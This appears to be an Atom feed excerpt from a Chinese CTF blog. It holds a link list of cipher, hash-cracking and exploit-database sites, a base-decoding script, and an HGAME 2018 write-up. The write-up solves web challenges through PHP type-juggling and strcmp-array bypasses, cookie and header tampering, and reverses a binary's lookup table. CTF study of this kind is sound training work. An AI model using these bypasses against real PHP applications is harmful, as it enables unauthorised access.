&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;gu-dian-mi-ma-xue-gong-ju&quot;&gt;古典密码学工具&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;zai-xian-jie-mi&quot;&gt;在线解密&lt;&#x2F;h2&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;直链列表：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;atbash-cipher&#x2F;&quot;&gt;Atbash Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;rot13&#x2F;&quot;&gt;ROT13 Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;caesar&#x2F;&quot;&gt;Caesar Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;affine&#x2F;&quot;&gt;Affine Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;rail-fence&#x2F;&quot;&gt;Rail-fence Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;baconian&#x2F;&quot;&gt;Baconian Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;polybius-square&#x2F;&quot;&gt;Polybius Square Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;simple-substitution&#x2F;&quot;&gt;Simple Substitution Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;codes-and-nomenclators&#x2F;&quot;&gt;Codes and Nomenclators Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;columnar-transposition&#x2F;&quot;&gt;Columnar Transposition Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;autokey&#x2F;&quot;&gt;Autokey Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;beaufort&#x2F;&quot;&gt;Beaufort Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;porta&#x2F;&quot;&gt;Porta Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;running-key&#x2F;&quot;&gt;Running Key Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;vigenere-gronsfeld-and-autokey&#x2F;&quot;&gt;Vigenère and Gronsfeld Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;homophonic-substitution&#x2F;&quot;&gt;Homophonic Substitution Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;four-square&#x2F;&quot;&gt;Four-Square Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;hill&#x2F;&quot;&gt;Hill Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;playfair&#x2F;&quot;&gt;Playfair Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;adfgvx&#x2F;&quot;&gt;ADFGVX Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;adfgx&#x2F;&quot;&gt;ADFGX Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;bifid&#x2F;&quot;&gt;Bifid Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;straddle-checkerboard&#x2F;&quot;&gt;Straddle Checkerboard Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;trifid&#x2F;&quot;&gt;Trifid Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;fractionated-morse&#x2F;&quot;&gt;Fractionated Morse Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;mechanical-era&#x2F;enigma&#x2F;&quot;&gt;Enigma Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;mechanical-era&#x2F;lorenz&#x2F;&quot;&gt;Lorenz Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;另一个网站： &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;tool.yovisun.com&#x2F;wordcounter&#x2F;&quot;&gt;WordCounter 英文论文单词统计&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;另一个维吉尼亚：https:&#x2F;&#x2F;atomcated.github.io&#x2F;Vigenere&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;另一个维吉尼亚：http:&#x2F;&#x2F;www.mygeocachingprofile.com&#x2F;codebreaker.vigenerecipher.aspx&lt;&#x2F;p&gt;
&lt;p&gt;另一个维吉尼亚：https:&#x2F;&#x2F;f00l.de&#x2F;hacking&#x2F;vigenere.php&lt;&#x2F;p&gt;
&lt;p&gt;文字加密解密： http:&#x2F;&#x2F;www.qqxiuzi.cn&#x2F;bianma&#x2F;wenbenjiami.php&lt;&#x2F;p&gt;
&lt;p&gt;单表替换：https:&#x2F;&#x2F;quipqiup.com&#x2F;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ku&quot;&gt;库&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;pycipher.readthedocs.io&#x2F;en&#x2F;master&#x2F;#&quot;&gt;pycipher&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;shu-lun-ji-suan-qi&quot;&gt;数论计算器&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.alpertron.com.ar&#x2F;CALTORS.HTM&lt;&#x2F;p&gt;
&lt;h1 id=&quot;brainfuck&quot;&gt;Brainfuck&lt;&#x2F;h1&gt;
&lt;p&gt;http:&#x2F;&#x2F;esoteric.sange.fi&#x2F;brainfuck&#x2F;impl&#x2F;interp&#x2F;i.html&lt;&#x2F;p&gt;
&lt;h1 id=&quot;pwn-cheatsheet&quot;&gt;PWN-cheatsheet&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;Naetw&#x2F;CTF-pwn-tips&lt;&#x2F;p&gt;
&lt;h1 id=&quot;phpdai-ma-zai-xian-zhi-xing&quot;&gt;PHP代码在线执行&lt;&#x2F;h1&gt;
&lt;p&gt;http:&#x2F;&#x2F;sandbox.onlinephpfunctions.com&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;zai-xian-sao-ma&quot;&gt;在线扫码&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;online-barcode-reader.inliteresearch.com&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;md5po-jie&quot;&gt;MD5破解&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;somd5.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.md5online.org&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;hashpo-jie&quot;&gt;HASH破解&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.onlinehashcrack.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;crackstation.net&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;zai-xian-ocr&quot;&gt;在线OCR&lt;&#x2F;h1&gt;
&lt;p&gt;http:&#x2F;&#x2F;jinapdf.com&#x2F;cn&#x2F;image-to-text-file.php&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;ocr.wdku.net&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;basejia-zu-zi-dong-jie&quot;&gt;base家族自动解&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;# -*- coding: utf-8 -*-
# Python3
# AutoBase.py
from base64 import *
s = input()
lis1 = [s]
lis2 = []
lis3 = []
lis4 = []
while(1):
	for a in lis1:
		ok = 0
		try:
			lis2.append(b64decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		try:
			lis2.append(b32decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		try:
			lis2.append(b16decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		if not ok:
			lis3.append(a)
	if not len(lis2):
		break
	lis1=lis2.copy()
	lis2.clear()
for a in range(0,len(lis3)):
	ok = 1
	for b in lis3[a]:
		if ord(b)&amp;gt;126 or ord(b)&amp;lt;32:
			ok = 0
			break
	if ok:
		lis4.append(lis3[a])
print(lis4)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;lou-dong-ping-tai&quot;&gt;漏洞平台&lt;&#x2F;h1&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.cnnvd.org.cn&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.cnvd.org.cn&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;exploit-db.com&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.exploit-id.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;cve.mitre.org&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.securiteam.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;securityvulns.com&#x2F; (更新至2015.02.11)&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;securityvulns.ru&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.securityfocus.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;marc.info&#x2F;?l=bugtraq&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.securitytracker.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;packetstormsecurity.com&#x2F;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;ti-mu&quot;&gt;题目&lt;&#x2F;h1&gt;
&lt;p&gt;https:&#x2F;&#x2F;ctftime.org&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;shell-storm.org&#x2F;repo&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.jarvisoj.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;oj.xctf.org.cn&#x2F;web&#x2F;login&#x2F;?next=&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.shiyanbar.com&#x2F;ctf&#x2F;practice&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;ctf.nuptsast.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;cgctf.nuptsast.com&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;skidophrenia.ctfd.io&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.ichunqiu.com&#x2F;battalion&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;cxsecurity.com&#x2F;exploit&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;reversing.kr&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;pwnable.kr&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;codeengn.com&#x2F;challenges&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;exploit-exercises.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;io.netgarage.org&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;hackinglab.cn&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;captf.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.baimaoxueyuan.com&#x2F;ctf&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;hkyx.myhack58.com&#x2F;index.html&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;overthewire.org&#x2F;wargames&#x2F;krypton&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;backdoor.sdslabs.co&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.hetianlab.com&#x2F;CTFrace.html&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;security.cs.rpi.edu&#x2F;courses&#x2F;binexp-spring2015&#x2F;&quot;&gt;http:&#x2F;&#x2F;security.cs.rpi.edu&#x2F;courses&#x2F;binexp-spring2015&#x2F;&lt;&#x2F;a&gt; &lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.wechall.net&#x2F;challs&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;smashthestack.org&#x2F;wargames.html&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;microcorruption.com&#x2F;login&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.hackthissite.org&#x2F;pages&#x2F;index&#x2F;index.php&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;exploit-exercises.com&#x2F;protostar&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;ctf.bugku.com&#x2F;challenges&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;id0-rsa.pub&#x2F;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>HGAME2018-week1WP</title>
		<published>2018-02-08T10:17:34+08:00</published>
		<updated>2020-08-07T01:48:37.522860+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/hgame2018-week1wp/" type="text/html"/>
		<id>https://CSUwangj.github.io/hgame2018-week1wp/</id>
		<content type="html">&lt;p&gt;第一周难度还是挺温柔，居然让我AK了，好开心呀&lt;&#x2F;p&gt;
&lt;p&gt;对了，这篇是先在本地生成的，周日才传上博客的。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;web&quot;&gt;Web&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;are-you-from-europe&quot;&gt;Are you from Europe?&lt;&#x2F;h2&gt;
&lt;p&gt;第一次做这种题，还学到了一点浏览器console的用法……
直接看源码，最开始发现在F12的console里输入quartz +=100000000有用
然后很开心地抽卡，抽了半天感觉不对，仔细看了下概率……淦哦我是不是傻&lt;&#x2F;p&gt;
&lt;p&gt;翻到最底下有个函数，看着就是和flag有关的样子
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_010720.png&quot; alt=&quot;Are_you_from_Europe?1&quot; &#x2F;&gt;
代码美化一哈
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_010751.png&quot; alt=&quot;Are_you_from_Europe?2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;special-number&quot;&gt;special number&lt;&#x2F;h2&gt;
&lt;p&gt;源码已经放了出来&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;PHP&quot; class=&quot;language-PHP &quot;&gt;&lt;code class=&quot;language-PHP&quot; data-lang=&quot;PHP&quot;&gt;include_once(&amp;quot;flag.php&amp;quot;);
if(isset($_GET[&amp;#x27;key&amp;#x27;])){
    $pattern = &amp;#x27;&amp;#x2F;^(?=.*[0-9].*)(?=.*[a-zA-Z].*).{7,}$&amp;#x2F; &amp;#x27;;
    $key = $_GET[&amp;#x27;key&amp;#x27;];
    if(preg_match($pattern,$key)===0){
        echo &amp;quot;格式错误&amp;quot;;
    }else{
        $lock=&amp;quot;******************&amp;quot;;
        $b = json_decode($key);
        if($b==$lock)
            echo $flag;
        else
            echo &amp;quot;this is no special number&amp;quot;;
    }
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这个题的考点就是PHP弱类型中0==string这个情况（PHP混乱邪恶无疑
就是要让json_decode出来的结果是0，于是在沙盒http:&#x2F;&#x2F;sandbox.onlinephpfunctions[.]com&#x2F;里实验出了结果
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215726.png&quot; alt=&quot;special_number1&quot; &#x2F;&gt;
然后去原网页的时候还失败了一次……
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215734.png&quot; alt=&quot;special_number2&quot; &#x2F;&gt;
因为传入的时候会再加对引号……
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_215746.png&quot; alt=&quot;special_number3&quot; &#x2F;&gt;
这里必须感谢一下飘零大大指点的，一开始光想着怎么绕过正则，反而偏离了正轨
顺便正则的效果大概是需要传入的字符串既有数字又有字母长度大于6就行&lt;&#x2F;p&gt;
&lt;h2 id=&quot;can-u-find-me&quot;&gt;can u find me?&lt;&#x2F;h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Description 
only robot know where is the flag&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;那当然是robots.txt啦，这不是送？
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_201235.png&quot; alt=&quot;can_u_find_me?1&quot; &#x2F;&gt;
直接访问看到
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_104340.png&quot; alt=&quot;can_u_find_me?2&quot; &#x2F;&gt;
抓包看看，发现Cookie里有个user=
补上，发出，得flag
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_201018.png&quot; alt=&quot;can_u_find_me?3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tell-me-what-you-want&quot;&gt;tell me what you want&lt;&#x2F;h2&gt;
&lt;p&gt;这个题就是纯练改HTTP头的
点进去问你想要啥，你输flag告诉你用POST更好，然后之后每改一次都会告诉你新的要改的地方，全改完得到flag
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_202350.png&quot; alt=&quot;tell_me_what_you_want&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;wo-men-bu-yi-yang&quot;&gt;我们不一样&lt;&#x2F;h2&gt;
&lt;p&gt;还是源码放出，还是弱类型&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;PHP&quot; class=&quot;language-PHP &quot;&gt;&lt;code class=&quot;language-PHP&quot; data-lang=&quot;PHP&quot;&gt;include_once(&amp;quot;flag.php&amp;quot;);
if (isset($_POST[&amp;#x27;str1&amp;#x27;]) &amp;amp;&amp;amp; isset($_POST[&amp;#x27;str2&amp;#x27;])) {

	if ($_POST[&amp;#x27;str1&amp;#x27;] != $_POST[&amp;#x27;str2&amp;#x27;] &amp;amp;&amp;amp; strcmp($_POST[&amp;#x27;str1&amp;#x27;], $_POST[&amp;#x27;str2&amp;#x27;]) == 0) {
		echo &amp;quot;flag is:&amp;quot;.$flag;
		exit();
	} else {
		echo &amp;quot;Something wrong..&amp;quot;;
	}
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里的弱类型在于string和非string的strcmp返回0，而array!=string成立
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_231047.png&quot; alt=&quot;我们不一样&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;rev&quot;&gt;Rev&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;re0&quot;&gt;re0&lt;&#x2F;h2&gt;
&lt;p&gt;拖进IDA，F5出flag
&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180204_230513.png&quot; alt=&quot;re0&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;baby-crack&quot;&gt;baby_crack&lt;&#x2F;h2&gt;
&lt;p&gt;拖进IDA，F5，读代码。发现对操作做了这样的操作：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;按位置进行循环移位&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180208_110243.png&quot; alt=&quot;baby_crack1&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
&lt;li&gt;将输入的每个通过一个映射转到另一个&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_110549.png&quot; alt=&quot;baby_crack2&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
&lt;li&gt;进行几轮交换&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week1wp&#x2F;snipaste20180205_110559.png&quot; alt=&quot;baby_crack3&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
&lt;li&gt;与flag进行同意操作得到的结果进行比较
于是写出反着来的操作&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&amp;#x2F;&amp;#x2F;baby1.cpp
#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
using namespace std;
int indx[]={17,191,186,15,213,204,188,30,25,1,135,27,150,195,134,26,126,107,90,141,251,194,139,179,177,221,239,10,75,248,85,38,118,171,193,100,23,201,175,97,103,74,202,18,36,225,174,80,58,112,55,237,224,119,183,46,161,45,50,123,137,207,240,148,33,101,11,63,125,41,59,5,81,231,129,110,51,198,215,172,60,154,34,220,122,8,106,151,241,95,142,98,111,19,138,130,140,42,73,57,24,104,208,131,180,66,54,113,12,87,16,243,40,212,52,14,228,255,6,173,92,252,219,222,218,159,234,53,94,120,82,217,79,109,187,168,176,21,67,144,37,166,84,254,13,235,169,253,233,93,22,203,47,78,189,197,9,70,247,192,31,89,211,2,35,157,96,4,132,246,164,29,49,76,200,155,199,223,102,44,236,121,115,48,105,99,149,214,190,68,232,165,242,153,216,56,160,227,143,210,83,61,86,146,114,250,184,167,205,238,147,133,108,127,170,178,71,206,128,32,28,124,7,226,185,145,69,116,152,245,62,3,196,65,1,43,72,39,230,91,244,156,136,117,162,182,20,209,229,77,64,249,158,88,163};
int arr[]={166,78,5,162,182,8,162,206,140,238,32,194,152,160,208,205,35,166,106,130};
int main()
{
&amp;#x2F;&amp;#x2F;	int a;
&amp;#x2F;&amp;#x2F;	while(cin&amp;gt;&amp;gt;a){
&amp;#x2F;&amp;#x2F;		cout&amp;lt;&amp;lt;indx[a]&amp;lt;&amp;lt;endl;
&amp;#x2F;&amp;#x2F;	}
	for(int i=0;i&amp;lt;20;++i){
		for(int j=0;j&amp;lt;256;++j){
			if(indx[j]==arr[i]){
				cout&amp;lt;&amp;lt;int(*(char*)(&amp;amp;j))&amp;lt;&amp;lt;&amp;#x27;,&amp;#x27;;
			}
		}
	}
	return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
